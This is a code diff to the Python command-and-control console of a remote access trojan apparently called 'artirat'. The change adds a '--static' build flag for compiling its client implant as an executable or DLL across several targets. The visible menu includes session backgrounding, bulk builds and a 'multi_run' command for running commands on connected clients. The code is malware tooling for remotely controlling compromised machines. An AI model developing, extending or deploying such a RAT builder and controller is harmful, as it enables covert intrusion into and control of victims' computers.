@@ -409,7 +409,7 @@ def _stream_cargo(cmd, cwd, env, verbose=False):
     return r.returncode
 
 
-def build_client(target: str, verbose=False):
+def build_client(target: str, verbose=False, static=False):
     targets = {
         "windows": "x86_64-pc-windows-gnu",
         "linux": "x86_64-unknown-linux-gnu",
@@ -438,7 +438,7 @@ def build_client(target: str, verbose=False):
     if is_dll:
         cmd = ["cargo", "build", "--release", "--lib", "--features", "shared-lib", "--target", t]
     else:
-        if not is_windows:
+        if static:
             rustflags = f"{rustflags} -C target-feature=+crt-static".strip()
         cmd = ["cargo", "build", "--release", "--bin", "artirat_client", "--target", t]
     if rustflags:
@@ -579,21 +579,22 @@ def c2_menu(manager: ClientManager):
                 print(f"[Backgrounded session with client {cid}]")
         elif cmd == "build":
             if len(parts) < 2:
-                print("Usage: build <target> [--verbose]")
-                print("       build all [--verbose]")
+                print("Usage: build <target> [--verbose] [--static]")
+                print("       build all [--verbose] [--static]")
                 print(f"Targets: {', '.join(ALL_BUILD_TARGETS)}")
                 continue
             verbose = "--verbose" in parts
+            static = "--static" in parts
             target_arg = parts[1]
             if target_arg == "all":
                 targets = EXE_BUILD_TARGETS
                 for t in targets:
                     print(f"\n{'='*60}")
-                    build_client(t, verbose=verbose)
+                    build_client(t, verbose=verbose, static=static)
                 print(f"\n{'='*60}")
                 print("[+] All builds finished")
             else:
-                build_client(target_arg, verbose=verbose)
+                build_client(target_arg, verbose=verbose, static=static)
         elif cmd == "multi_run":
             if len(parts) < 2:
                 print("Usage: multi_run <command>")
